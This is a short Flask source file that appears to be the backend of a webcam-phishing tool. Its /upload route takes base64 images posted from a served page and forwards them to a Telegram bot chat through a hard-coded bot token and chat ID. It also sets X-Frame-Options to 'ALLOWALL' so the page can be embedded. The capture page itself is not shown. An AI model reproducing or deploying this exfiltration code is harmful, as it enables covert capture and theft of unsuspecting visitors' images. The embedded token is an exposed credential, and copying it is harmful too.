from flask import Flask, render_template, request, make_response
import requests
import base64
app = Flask(__name__)

TOKEN = '8639009325:AAEqWTIdefasWQ8Hkr8i3mQck18AjBdwGpE'
ID = '5360002210'

@app.after_request
def add_header(response):
    response.headers['X-Frame-Options'] = 'ALLOWALL'
    return response

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    try:
        img_data = request.json['img'].split(',')[1]
        requests.post(f'https://api.telegram.org/bot{TOKEN}/sendPhoto', data={'chat_id': ID}, files={'photo': ('img.jpg', base64.b64decode(img_data))})
        return 'ok'
    except: return 'error'